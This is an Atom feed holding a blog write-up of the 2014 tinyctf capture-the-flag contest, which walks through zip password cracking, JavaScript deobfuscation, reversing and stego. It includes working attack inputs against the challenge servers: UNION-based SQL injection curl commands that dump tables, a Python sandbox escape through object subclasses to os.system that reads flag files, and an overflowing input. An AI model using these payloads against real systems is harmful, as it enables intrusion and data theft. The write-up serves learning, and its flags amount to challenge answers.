<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Ctf | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2014-12-02T22:07:47+01:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Tinyctf Writeup]]></title>
    <link href="http://barrebas.github.io/blog/2014/10/03/tinyctf/"/>
    <updated>2014-10-03T19:25:41+02:00</updated>
    <id>http://barrebas.github.io/blog/2014/10/03/tinyctf</id>
    <content type="html"><![CDATA[<p><code>tinyctf</code> was ran by @balidani and was actually a very enjoyable Jeopardy-style CTF event! I spent quite some time on the challenges and got all flags except crypto200. I kept some notes in <code>keepnote</code> which I converted to this blog post. The name of each challenge was a hint for solving the challenge. The author hinted at a VM containing all the challenges, so keep you eyes peeled for that one.</p>

<!--more-->


<h1>misc50</h1>

<p>Clearly, this was <code>brainfuck</code> code! Yay for <code>brainfuck</code>! Unfortunately, this being a CTF, I quickly entered the bf code in an online interpreter, got the flag and did not keep any notes. But yay for <code>bf</code>!</p>

<h1>misc100 aka Janos the Ripper</h1>

<p>The zip file contained a second zip file with a password-protected file called &lsquo;flag&rsquo;. The name of course hinted strongly in the direction of John the Ripper and indeed, JtR made quick work of this password-protected zip file:</p>

<p>{% highlight bash %}
bas@tritonal:~/tools/john-1.7.9-jumbo-7/run$ ./zip2john ~/tmp/misc100 > misc100.hashes
/home/bas/tmp/misc100->flag.txt PKZIP Encr: cmplen=39, decmplen=25, crc=7788D444
bas@tritonal:~/tools/john-1.7.9-jumbo-7/run$ ./john ./misc100.hashes
Loaded 1 password hash (PKZIP [32/64])
fish             (/home/bas/tmp/misc100)
guesses: 1  time: 0:00:00:00 DONE (Mon Sep 29 22:14:44 2014)  c/s: 388328  trying: marisol - help
Use the &ldquo;&ndash;show&rdquo; option to display all of the cracked passwords reliably
{% endhighlight %}</p>

<p><code>flag{ev3n::y0u::bru7us?!}</code></p>

<h1>web100</h1>

<p>This challenge presents us again with a file to download, which turns out to be a heavily obfuscated <code>javascript</code> file. Between the javascript statements are strange bytes values, such as <code>0x02</code> or <code>0x01</code>. These are not visible in the code below.</p>

<p>{% highlight html %}</p>

<script>_='function $(){e=getEleById("c").value;length==16^be0f23233ace98aa$c7be9){tfls_aie}na_h0lnrg{e_0iit\'_ns=[t,n,r,i];for(o=0;o<13;++o){  [0]);.splice(0,1)}}}    \'<input id="c">< onclick=$()>Ok</>\');delete _var ","docu.)match(/"];/)!=null=["   write(s[o%4]buttonif(e.ment';for(Y in $='   ')with(_.split($[Y]))_=join(pop());eval(_)</script>


<p>{% endhighlight %}</p>

<p>I had little luck trying to reverse this javascript. I noticed that the entire string is parsed with <code>eval</code> so I just replaced it with <code>alert</code> and ran the javascript. I was presented with the following code, after pulling it through <a href="http://jsbeautifier.org/">jsbeautifier.org</a>:</p>

<p>{% highlight javascript %}
function $() {
    var e = document.getElementById(&ldquo;c&rdquo;).value;
    if (e.length == 16)
        if (e.match(/^be0f23/) != null)
            if (e.match(/233ac/) != null)
                if (e.match(/e98aa$/) != null)
                    if (e.match(/c7be9/) != null) {
                        var t = [&ldquo;fl&rdquo;, &ldquo;s_a&rdquo;, &ldquo;i&rdquo;, &ldquo;e}&rdquo;];
                        var n = [&ldquo;a&rdquo;, &ldquo;<em>h0l&rdquo;, &ldquo;n&rdquo;];
                        var r = [&ldquo;g{&rdquo;, &ldquo;e&rdquo;, &ldquo;</em>0&rdquo;];
                        var i = [&ldquo;it&#8217;&rdquo;, &ldquo;_&rdquo;, &ldquo;n&rdquo;];
                        var s = [t, n, r, i];
                        for (var o = 0; o &lt; 13; ++o) {
                            document.write(s[o % 4][0]);
                            s[o % 4].splice(0, 1)
                        }
                    }
}
document.write(&lsquo;<input id="c"><button onclick=$()>Ok</button>&rsquo;);
delete _
{% endhighlight %}</p>

<p>So the original javascript replaces all the weird bytes and then runs this code, which obviously checks the input. If it is valid, it will unmangle the flag. I was not able to get the proper string, but who cares when I can just run:</p>

<p>{% highlight html %}</p>

<script>function $() {
                        var t = ["fl", "s_a", "i", "e}"];
                        var n = ["a", "_h0l", "n"];
                        var r = ["g{", "e", "_0"];
                        var i = ["it'", "_", "n"];
                        var s = [t, n, r, i];
                        for (var o = 0; o < 13; ++o) {
                            document.write(s[o % 4][0]);
                            s[o % 4].splice(0, 1)
                        }
}
document.write('<input id="c"><button onclick=$()>Ok</button>');</script>


<p>{% endhighlight %}</p>

<p><code>flag{it's_a_h0le_in_0ne}</code></p>

<h1>web200</h1>

<p>This was a fun one. We&rsquo;re presented with a webpage about rollercoasters and a search box. We can search for values in the name, park or country. This smells like SQLi. I tried a couple of things in the search box, but this got me nowhere. I viewed the source of the webpage and lo-and-behold: it looks like we can specify the column name to be searched ourselves! I switched over to <code>curl</code> to check this. After a bit of fumbling around for the proper syntax, I came up with this:</p>

<p>{% highlight bash %}
bas@tritonal:~/tmp$ curl -v &ldquo;<a href="http://54.69.118.120:8000/index.php">http://54.69.118.120:8000/index.php</a>&rdquo; &ndash;data &ldquo;value=999&amp;column=height &lt; 0 union select 1,2,3,4 &ndash; #&rdquo;
* About to connect() to 54.69.118.120 port 8000 (#0)
*   Trying 54.69.118.120&hellip;
* connected
&hellip;snip&hellip;
        <div id="content" class="whitebox">
            <table>
                <tr>
                    <th>
                        Name
                    </th>
                    <th>
                        Park
                    </th>
                    <th>
                        Country
                    </th>
                    <th>
                        Height
                    </th></p>

<pre><code>            &lt;/tr&gt;&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;4 m&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
</code></pre>

<p>&hellip;snip&hellip;
{% endhighlight %}</p>

<p>You can see that the webpage nicely returns the values 1, 2, 3 and 4, verifying a SQL injection. Next, I assumed MySQL and grabbed the table names:</p>

<p>{% highlight bash %}
bas@tritonal:~/tmp$ curl -v &ldquo;<a href="http://54.69.118.120:8000/index.php">http://54.69.118.120:8000/index.php</a>&rdquo; &ndash;data &ldquo;value=999&amp;column=height &lt; 0 union select 1,2,table_name,0 from information_schema.tables &ndash; #&rdquo;
&hellip;snip&hellip;
<td>setup_timers</td><td>0 m</td></tr><tr><td>1</td><td>2</td><td>threads</td><td>0 m</td></tr><tr><td>1</td><td>2</td><td>flag</td><td>0 m</td></tr><tr><td>1</td><td>2</td><td>rollercoaster</td><td>0 m</td></tr></table>
&hellip;snip&hellip;
{% endhighlight %}</p>

<p>Looks like there is a table named <code>flag</code>! Let&rsquo;s grab column names:</p>

<p>{% highlight bash %}
bas@tritonal:~/tmp$ curl -v &ldquo;<a href="http://54.69.118.120:8000/index.php">http://54.69.118.120:8000/index.php</a>&rdquo; &ndash;data &ldquo;value=999&amp;column=height &lt; 0 union select 1,2,column_name,0 from information_schema.columns where table_name = &lsquo;flag&rsquo; &ndash; #&rdquo;
{% endhighlight %}</p>

<p>This returned the column <code>hash</code>. Get the flag!</p>

<p>{% highlight bash %}
bas@tritonal:~/tmp$ curl -v &ldquo;<a href="http://54.69.118.120:8000/index.php">http://54.69.118.120:8000/index.php</a>&rdquo; &ndash;data &ldquo;value=999&amp;column=height &lt; 0 union select 1,2,hash,0 from flag &ndash; #&rdquo;
{% endhighlight %}</p>

<p><code>flag{unroll_those_loops}</code></p>

<h1>rev100</h1>

<p>Unpacking the zip file gave me a file that looked like the output of <code>xxd</code>:</p>

<p>{% highlight diff %}
00400080  68 66 6C 00 00 48 BF 01  00 00 00 00 00 00 00 48
00400090  8D 34 24 48 BA 02 00 00  00 00 00 00 00 48 B8 01
004000A0  00 00 00 00 00 00 00 0F  05 68 61 67 00 00 48 BF
004000B0  01 00 00 00 00 00 00 00  48 8D 34 24 48 BA 02 00
004000C0  00 00 00 00 00 00 48 B8  01 00 00 00 00 00 00 00
004000D0  0F 05 68 7B 70 00 00 48  BF 01 00 00 00 00 00 00
004000E0  00 48 8D 34 24 48 BA 02  00 00 00 00 00 00 00 48
004000F0  B8 01 00 00 00 00 00 00  00 0F 05 68 6F 70 00 00
00400100  48 BF 01 00 00 00 00 00  00 00 48 8D 34 24 48 BA
00400110  02 00 00 00 00 00 00 00  48 B8 01 00 00 00 00 00
00400120  00 00 0F 05 68 70 6F 00  00 48 BF 01 00 00 00 00
00400130  00 00 00 48 8D 34 24 48  BA 02 00 00 00 00 00 00
00400140  00 48 B8 01 00 00 00 00  00 00 00 0F 05 68 70 72
00400150  00 00 48 BF 01 00 00 00  00 00 00 00 48 8D 34 24
00400160  48 BA 02 00 00 00 00 00  00 00 48 B8 01 00 00 00
00400170  00 00 00 00 0F 05 68 65  74 00 00 48 BF 01 00 00
00400180  00 00 00 00 00 48 8D 34  24 48 BA 02 00 00 00 00
00400190  00 00 00 48 B8 01 00 00  00 00 00 00 00 0F 05 68
004001A0  7D 0A 00 00 48 BF 01 00  00 00 00 00 00 00 48 8D
004001B0  34 24 48 BA 02 00 00 00  00 00 00 00 48 B8 01 00
004001C0  00 00 00 00 00 00 0F 05  48 31 FF 48 B8 3C 00 00
004001D0  00 00 00 00 00 0F 05
{% endhighlight %}</p>

<p>Reversing the process with <code>xxd -r</code> gave me a 4 MB file which didn&rsquo;t really help much. Instead, looking at the address and bytes, I somehow got the feeling this was assembly code. So I extracted all the bytes with some quick &amp; dirty bash-fu (&lsquo;cause ctf):</p>

<p>{% highlight bash %}
cat rev100 |awk &lsquo;{print $2$3$4$5$6$7$8$9$10$11$12$13$14$15$16$17}&rsquo; | tr -d &lsquo;\r\n&rsquo;
68666C000048BF0100000000000000488D342448BA020000000000000048B80&hellip;snip&hellip;
{% endhighlight %}</p>

<p>Now <code>radare2</code> comes to the rescue again! Notice the <code>-b 64</code> flag to specify x64 code.</p>

<p>{% highlight bash %}
bas@tritonal:~/tmp$ rasm2 -b 64 -d &ldquordquo;
push dword 0x6c66
mov rdi, 0x1
lea rsi, [rsp]
mov rdx, 0x2
mov rax, 0x1
syscall
push dword 0x6761
mov rdi, 0x1
lea rsi, [rsp]
mov rdx, 0x2
mov rax, 0x1
syscall
..snip&hellip;
push dword 0xa7d
mov rdi, 0x1
lea rsi, [rsp]
mov rdx, 0x2
mov rax, 0x1
syscall
xor rdi, rdi
mov rax, 0x3c
syscall
{% endhighlight %}</p>

<p>Looks like it wants to use syscall to print characters to the screen. Instead, I extract the values:</p>

<p>{% highlight bash %}
bas@tritonal:~/tmp$ rasm2 -b 64 -d &ldquordquo; | grep &ldquo;push dword&rdquo; |awk &lsquo;{print $3}&rsquo;
0x6c66
0x6761
0x707b
0x706f
0x6f70
0x7270
0x7465
0xa7d
{% endhighlight %}</p>

<p><code>xxd -p -r</code> helps to read these bytes.</p>

<p><code>flag{poppopret}</code></p>

<h1>rev200</h1>

<p>This was an annoying challenge. I sort of knew what to do, but couldn&rsquo;t get the proper tools running. The zip file seems to contain an APK file. I tried to run it in an emulator, but did not succeed. I tried four different disassembler and struck gold with <a href="http://code.google.com/p/android-apktool">android-apktool</a>. This tool could disassemble the APK file:</p>

<p>{% highlight bash %}
java -jar apktool.jar -d ./rev200.apk
{% endhighlight %}</p>

<p>Grepping the files for &lsquo;flag&rsquo; only returned a string id starting with &ldquo;0x7f0..&rdquo; but this was of no use. I started looking at each file, but one stuck out:</p>

<p>{% highlight bash %}
bas@tritonal:~/tmp/apktool1.5.2/rev200/smali/ctf/crackme$ cat FlagActivity.smali
{% endhighlight %}</p>

<p>{% highlight java %}
.class public Lctf/crackme/FlagActivity;
.super Landroid/app/Activity;
.source &ldquo;FlagActivity.java&rdquo;</p>

<p>&hellip;snip&hellip;</p>

<pre><code>.line 20
.end local v2           #flagText:Landroid/widget/TextView;
:cond_0
aget v4, v0, v3

int-to-char v4, v4

invoke-static {v4}, Ljava/lang/String;-&gt;valueOf(C)Ljava/lang/String;

move-result-object v4

invoke-virtual {v1, v4}, Ljava/lang/String;-&gt;concat(Ljava/lang/String;)Ljava/lang/String;

move-result-object v1

.line 19
add-int/lit8 v3, v3, 0x1

goto :goto_0

.line 17
nop

:array_0
.array-data 0x4 
    0x66t 0x0t 0x0t 0x0t 
    0x6ct 0x0t 0x0t 0x0t 
    0x61t 0x0t 0x0t 0x0t 
    0x67t 0x0t 0x0t 0x0t 
    0x7bt 0x0t 0x0t 0x0t 
    0x77t 0x0t 0x0t 0x0t 
    0x34t 0x0t 0x0t 0x0t 
    0x6et 0x0t 0x0t 0x0t 
    0x6et 0x0t 0x0t 0x0t 
    0x34t 0x0t 0x0t 0x0t 
    0x5ft 0x0t 0x0t 0x0t 
    0x6at 0x0t 0x0t 0x0t 
    0x34t 0x0t 0x0t 0x0t 
    0x72t 0x0t 0x0t 0x0t 
    0x5ft 0x0t 0x0t 0x0t 
    0x6dt 0x0t 0x0t 0x0t 
    0x79t 0x0t 0x0t 0x0t 
    0x5ft 0x0t 0x0t 0x0t 
    0x64t 0x0t 0x0t 0x0t 
    0x33t 0x0t 0x0t 0x0t 
    0x78t 0x0t 0x0t 0x0t 
    0x7dt 0x0t 0x0t 0x0t 
.end array-data
</code></pre>

<p>.end method
{% endhighlight %}</p>

<p><code>flag{w4nn4_j4r_my_d3x}</code></p>

<h1>rev300 &ldquo;elrond32&rdquo;</h1>

<p>The challenge name was a big hint. Apparently, &lsquo;Elrond&rsquo; is linked to Lord of the Rings. The zip file contains a Linux ELF binary. Upon running the binary, all I got was <code>Access Denied</code>. Disassembling in <code>gdb</code> and analysis showed that the program takes exactly one argument. The length of this string must be exactly 8, no more, no less. The program then starts to compare the values of each byte. It jumps to the relative sections of code using a jumptable. I first did:</p>

<p>{% highlight bash %}
bas@tritonal:~/tmp$ objdump -d rev300 |grep &ldquo;cmp &rdquo;       <br/>
 80483b6:   39 d8                   cmp    %ebx,%eax
 80483d4:   39 d8                   cmp    %ebx,%eax
 8048439:   3c 6e                   cmp    $0x6e,%al
 8048451:   3c 72                   cmp    $0x72,%al
 8048469:   3c 64                   cmp    $0x64,%al
 804847d:   3c 65                   cmp    $0x65,%al
 8048491:   3c 69                   cmp    $0x69,%al
 80484a5:   3c 61                   cmp    $0x61,%al
 80484b9:   3c 67                   cmp    $0x67,%al
 80484ca:   3c 73                   cmp    $0x73,%al
 8048675:   39 fe                   cmp    %edi,%esi
 80486ac:   83 f8 ff                cmp    $0xffffffff,%eax
 80486bf:   83 f8 ff                cmp    $0xffffffff,%eax
{% endhighlight %}</p>

<p>This already narrowed down the possible values for each byte quite a lot! Apparently, the program checks for the byte values &ldquo;sgnrdeia&rdquo;. I looked up the jumptable and started debugging the program.</p>

<p>{% highlight bash %}
gdb-peda$ x/8x 0x8048720
0x8048720:  0x0804848b  0x08048477  0x080484d5  0x08048433
0x8048730:  0x08048463  0x0804849f  0x080484b3  0x080484c4
{% endhighlight %}</p>

<p>When I was writing down the values the program was checking against, I was making a mistake and wrote down &lsquo;in.n&rsquo;. I looked at the rest of the letters and for some reason it clicked. I got lucky!</p>

<p>{% highlight bash %}
bas@tritonal:~/tmp$ ./rev300 isengard
Access granted
{% endhighlight %}
<code>flag{s0me7hing_S0me7hinG_t0lki3n}</code></p>

<h1>stego100</h1>

<p>Stego can be extremely hard but also quite fun once you &lsquo;get&rsquo; it. The zip file contained a PNG image showing the three vikings from The Lost Vikings. I did not notice any strange artifacts in the image so I ran <code>strings</code> on the image just to be sure.</p>

<p>{% highlight bash %}
bas@tritonal:~/tmp$ strings stego100
LdfO;</p>

<h1>tEXthint</h1>

<p><a href="http://i.imgur.com/22kUrzm.png">http://i.imgur.com/22kUrzm.png</a>
IEND
{% endhighlight %}</p>

<p>Hmm. Another PNG? It looked like the exact same image, but the file sizes differed. I tried to subtract the second image from the first in GIMP but that didn&rsquo;t work. I spent quite some time on it and I finally got it using <code>imagemagick</code>:</p>

<p>{% highlight bash %}
compare 22kUrzm.png stego100 diff.png
{% endhighlight %}</p>

<p>This created a difference file from both PNGs. This file had a very obvious QR code:</p>

<p><img src="/assets/stego100-diff.png" alt="" /></p>

<p>Scanning this QR code with a smartphone yielded <code>flag{#justdiffit}</code></p>

<h1>cry100</h1>

<p>The first and easiest crypto challenge. The zip file contained a text file with the following content:</p>

<p>{% highlight text %}
XMVZGC RGC AMG RVMG HGFGMQYCD VT VWM BYNO, NSVWDS NSGO RAO XG UWFN AF
HACDGMVWF. AIRVFN AII AMG JVRRVC-XVMC, FYRBIG TVIZ ESV SAH CGQGM XGGC
RVMG NSAC A RYIG TMVR NSG SVWFG ESGMG NSGO EGMG XVMC WCNYI NSG HAO
FVRG IVMH JARG MVWCH NV NAZG NSGR VTT NV EAM. OVWM TIAD YF &ldquo;CV NSYF
YF CVN JMOBNV RO HGAM&rdquo;, YC IVEGMJAFG, EYNS WCHGMFJVMGF YCFNGAH VT
FBAJGF, FWMMVWCHGH XO NSG WFWAI &ldquo;TIAD&rdquo; NAD ACH JWMIO XMAJGF. GCUVO.
{% endhighlight %}</p>

<p>This looked like either a Caesar cipher or a substitution cipher. Luckily, <a href="http://quipqiup.com/index.php">online solvers</a> exist.</p>

<p>{% highlight text %}
BROKEN MEN ARE MORE DESERVING OF OUR PITY, THOUGH THEY MAY BE JUST AS  DANGEROUS. ALMOST ALL ARE COMMON-BORN, SIMPLE FOLK WHO HAD NEVER BEEN  MORE THAN A MILE FROM THE HOUSE WHERE THEY WERE BORN UNTIL THE DAY  SOME LORD CAME ROUND TO TAKE THEM OFF TO WAR. YOUR FLAG IS &lsquo;NO THIS  IS NOT CRYPTO MY DEAR&rsquo;, IN LOWERCASE, WITH UNDERSCORES INSTEAD OF  SPACES, SURROUNDED BY THE USUAL &lsquo;FLAG&rsquo; TAG AND CURLY BRACES. ENJOY.
{% endhighlight %}</p>

<p><code>flag{no_this_is_not_crypto_my_dear}</code></p>

<h1>cry300</h1>

<p>A fun one! I read PoC||GTFO a lot, and the name of the challenge and the file screamed <code>electronic coloring book</code>. For more info, grab a copy of PoC||GTFO 0x05 from a neighbourly neighbour. The idea is that the image file, a 4k still, is encrypted with ECB, but this block cipher is very bad a encrypting. Repeated blocks can be &lsquo;colored&rsquo; in using <a href="https://github.com/doegox/ElectronicColoringBook/blob/master/ElectronicColoringBook.py">this script</a>.</p>

<p>{% highlight bash %}
bas@tritonal:~/tmp$ python colorbook.py -x 3840 ecb.bmp
{% endhighlight %}</p>

<p>The image is still a bit mangled, but after flipping the image vertically, the flag is legible:</p>

<p><img src="/assets/cry300.png" alt="" /></p>

<p><code>flag{no_penguin_here}</code></p>

<h1>pwn200</h1>

<p>A python jail! This reminded me of the CSAW python jail, but simpler. Upon connecting to the ip address, the user is dropped in a python shell. However, we can&rsquo;t use commands that contain</p>

<p>{% highlight python %}
    prohibited_keywords = [
        &ldquo;import&rdquo;,
        &ldquo;open&rdquo;,
        &ldquo;flag&rdquo;,
        &ldquo;eval&rdquo;,
        &ldquo;exec&rdquo;
    ]
{% endhighlight %}</p>

<p>Now, we wanna read the flag somehow. I found <a href="https://blog.inexplicity.de/plaidctf-2013-pyjail-writeup-part-i-breaking-the-sandbox.html">this writeup</a> to be very helpful. I followed that approach, abusing <code>().__class__.__base__.__subclasses__()</code> to finally call <code>os</code>. I still have no profound understanding of breaking python jails, but this and the CSAW example definitely helped.</p>

<p>{% highlight python %}
bas@tritonal:~$ nc 54.69.118.120 6000</p>

<h1>Welcome to Safe Interactive CPython Shell (SICS)</h1>

<p>Rules:
    - Wash your dishes
    - Don&rsquo;t eat the yellow snow
    - Do not import anything
    - No peeking at files!</p>

<p>baby@sics:~$
().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'sys.floatinfo'>, <type 'EncodingMap'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <class 'site._Printer'>, <class 'site._Helper'>, <type 'pwd.struct_passwd'>, <type 'file'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
baby@sics:~$
().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[49]
<class 'warnings.catch_warnings'>
baby@sics:~$
().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[49].<strong>init</strong>.func_globals[&ldquo;linecache&rdquo;].<strong>dict</strong>[&lsquo;os&rsquo;].system(&lsquo;cat /home/pybaby/flag&rsquo;)</p>

<h1>rekt</h1>

<p>baby@sics:~$
().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[49].<strong>init</strong>.func_globals[&ldquo;linecache&rdquo;].<strong>dict</strong>[&lsquo;os&rsquo;].system(&lsquo;cat /home/pybaby/flag.txt&rsquo;)</p>

<h1>rekt</h1>

<p>baby@sics:~$
().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[49].<strong>init</strong>.func_globals[&ldquo;linecache&rdquo;].<strong>dict</strong>[&lsquo;os&rsquo;].system(&lsquo;cat /home/pybaby/f*&rsquo;)  <br/>
flag{python_sandboxing:_harder_than_teaching_your_mom_dota}0
{% endhighlight %}</p>

<p><code>flag{python_sandboxing:_harder_than_teaching_your_mom_dota}</code></p>

<p>I just figured out another way to beat this one, using <code>__builtins__</code>. First, we need to get a way to call <code>open</code> without actually using the phrase &lsquo;open&rsquo;. We can display all the builtin functions like so:</p>

<p>{% highlight python %}
<strong>builtins</strong>.<strong>dict</strong>.keys()
baby@sics:~$ [&lsquo;bytearray&rsquo;, &lsquo;IndexError&rsquo;, &lsquo;all&rsquo;, &lsquo;help&rsquo;, &lsquo;vars&rsquo;, &lsquo;SyntaxError&rsquo;, &lsquo;unicode&rsquo;, &lsquo;UnicodeDecodeError&rsquo;, &lsquo;isinstance&rsquo;, &lsquo;copyright&rsquo;, &lsquo;NameError&rsquo;, &lsquo;BytesWarning&rsquo;, &lsquo;dict&rsquo;, &lsquo;input&rsquo;, &lsquo;oct&rsquo;, &lsquo;bin&rsquo;, &lsquo;SystemExit&rsquo;, &lsquo;StandardError&rsquo;, &lsquo;format&rsquo;, &lsquo;repr&rsquo;, &lsquo;sorted&rsquo;, &lsquo;False&rsquo;, &lsquo;RuntimeWarning&rsquo;, &lsquo;list&rsquo;, &lsquo;iter&rsquo;, &lsquo;reload&rsquo;, &lsquo;Warning&rsquo;, &lsquo;<strong>package</strong>&rsquo;, &lsquo;round&rsquo;, &lsquo;dir&rsquo;, &lsquo;cmp&rsquo;, &lsquo;set&rsquo;, &lsquo;bytes&rsquo;, &lsquo;reduce&rsquo;, &lsquo;intern&rsquo;, &lsquo;issubclass&rsquo;, &lsquo;Ellipsis&rsquo;, &lsquo;EOFError&rsquo;, &lsquo;locals&rsquo;, &lsquo;BufferError&rsquo;, &lsquo;slice&rsquo;, &lsquo;FloatingPointError&rsquo;, &lsquo;sum&rsquo;, &lsquo;getattr&rsquo;, &lsquo;abs&rsquo;, &lsquo;exit&rsquo;, &lsquo;print&rsquo;, &lsquo;True&rsquo;, &lsquo;FutureWarning&rsquo;, &lsquo;ImportWarning&rsquo;, &lsquo;None&rsquo;, &lsquo;hash&rsquo;, &lsquo;ReferenceError&rsquo;, &lsquo;len&rsquo;, &lsquo;credits&rsquo;, &lsquo;frozenset&rsquo;, &lsquo;<strong>name</strong>&rsquo;, &lsquo;ord&rsquo;, &lsquo;super&rsquo;, &lsquo;TypeError&rsquo;, &lsquo;license&rsquo;, &lsquo;KeyboardInterrupt&rsquo;, &lsquo;UserWarning&rsquo;, &lsquo;filter&rsquo;, &lsquo;range&rsquo;, &lsquo;staticmethod&rsquo;, &lsquo;SystemError&rsquo;, &lsquo;BaseException&rsquo;, &lsquo;pow&rsquo;, &lsquo;RuntimeError&rsquo;, &lsquo;float&rsquo;, &lsquo;MemoryError&rsquo;, &lsquo;StopIteration&rsquo;, &lsquo;globals&rsquo;, &lsquo;divmod&rsquo;, &lsquo;enumerate&rsquo;, &lsquo;apply&rsquo;, &lsquo;LookupError&rsquo;, &lsquo;open&rsquo;, &lsquo;quit&rsquo;, &lsquo;basestring&rsquo;, &lsquo;UnicodeError&rsquo;, &lsquo;zip&rsquo;, &lsquo;hex&rsquo;, &lsquo;long&rsquo;, &lsquo;next&rsquo;, &lsquo;ImportError&rsquo;, &lsquo;chr&rsquo;, &lsquo;xrange&rsquo;, &lsquo;type&rsquo;, &lsquo;<strong>doc</strong>&rsquo;, &lsquo;Exception&rsquo;, &lsquo;tuple&rsquo;, &lsquo;UnicodeTranslateError&rsquo;, &lsquo;reversed&rsquo;, &lsquo;UnicodeEncodeError&rsquo;, &lsquo;IOError&rsquo;, &lsquo;hasattr&rsquo;, &lsquo;delattr&rsquo;, &lsquo;setattr&rsquo;, &lsquo;raw_input&rsquo;, &lsquo;SyntaxWarning&rsquo;, &lsquo;compile&rsquo;, &lsquo;ArithmeticError&rsquo;, &lsquo;str&rsquo;, &lsquo;property&rsquo;, &lsquo;GeneratorExit&rsquo;, &lsquo;int&rsquo;, &lsquo;<strong>import</strong>&rsquo;, &lsquo;KeyError&rsquo;, &lsquo;coerce&rsquo;, &lsquo;PendingDeprecationWarning&rsquo;, &lsquo;file&rsquo;, &lsquo;EnvironmentError&rsquo;, &lsquo;unichr&rsquo;, &lsquo;id&rsquo;, &lsquo;OSError&rsquo;, &lsquo;DeprecationWarning&rsquo;, &lsquo;min&rsquo;, &lsquo;UnicodeWarning&rsquo;, &lsquo;execfile&rsquo;, &lsquo;any&rsquo;, &lsquo;complex&rsquo;, &lsquo;bool&rsquo;, &lsquo;ValueError&rsquo;, &lsquo;NotImplemented&rsquo;, &lsquo;map&rsquo;, &lsquo;buffer&rsquo;, &lsquo;max&rsquo;, &lsquo;object&rsquo;, &lsquo;TabError&rsquo;, &lsquo;callable&rsquo;, &lsquo;ZeroDivisionError&rsquo;, &lsquo;eval&rsquo;, &lsquo;<strong>debug</strong>&rsquo;, &lsquo;IndentationError&rsquo;, &lsquo;AssertionError&rsquo;, &lsquo;classmethod&rsquo;, &lsquo;UnboundLocalError&rsquo;, &lsquo;NotImplementedError&rsquo;, &lsquo;AttributeError&rsquo;, &lsquo;OverflowError&rsquo;]
{% endhighlight %}</p>

<p>On my system, the 80th value is &lsquo;open&rsquo;, but on the remote server, it&rsquo;s the 78th. Difference in Python version? Anyway, we can now call the fuction &lsquo;open&rsquo; like so and avoid the filter by using string concatenation:</p>

<p>{% highlight python %}
<strong>builtins</strong>.<strong>dict</strong><a href="" title="/home/pybaby/fl'+'ag"><strong>builtins</strong>.<strong>dict</strong>.keys()[78]</a>.readlines()
{% endhighlight %}</p>

<h1>pwn300</h1>

<p>By far the easiest 300 point challenge. Again, we&rsquo;re given an ip address. Upon connecting I did what I always do:</p>

<p>{% highlight bash %}
bas@tritonal:~$ nc 54.69.118.120 7000</p>

<h1>Welcome to Google Gamble.</h1>

<p>Google Gamble is easy. Guess the card drawn
from the deck and double your money! Make it all
the way to $1048576 to get a flag! Good luck!</p>

<p>Your current balance: 1$</p>

<p>Select an option:
1. Guess a card
2. Get the flag
3. Quit
1
Please enter your guess: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
The computer picked AAAAAAAAAAAA�        (Valet!)
Congrats, you won this round!
Your current balance: 2$</p>

<p>Select an option:
1. Guess a card
2. Get the flag
3. Quit
Please enter your guess: The computer picked AAAAAAAAAAAA
Congrats, you won this round!
Your current balance: 4$</p>

<p>Select an option:
1. Guess a card
2. Get the flag
3. Quit
Please enter your guess: The computer picked AAAAAA
�
Congrats, you won this round!
Your current balance: 8$
{% endhighlight %}</p>

<p>I have the sick tendency to either supply SQL injections or large repeats of &lsquo;A&rsquo;. Apparently, this program checks the guess of the user versus some precomputed value. However, the large input overwrites this precomputed value. The check will always be true and the money doubles. I just rinsed &amp; repeated until I had enough to extract the flag:</p>

<p>{% highlight bash %}
Select an option:
1. Guess a card
2. Get the flag
3. Quit
Please enter your guess: The computer picked AAAAAA
�
Congrats, you won this round!
Your current balance: 16777216$</p>

<p>Select an option:
1. Guess a card
2. Get the flag
3. Quit
2
Here is your well-deserved prize: flag{valet_knekt_jack_jumbo}
Congratulations!
Good bye!
{% endhighlight %}</p>

<p><code>flag{valet_knekt_jack_jumbo}</code></p>

<p>And that was it! I hope there&rsquo;s more of this <code>tinyctf</code> to come!</p>
]]></content>
  </entry>
  
</feed>
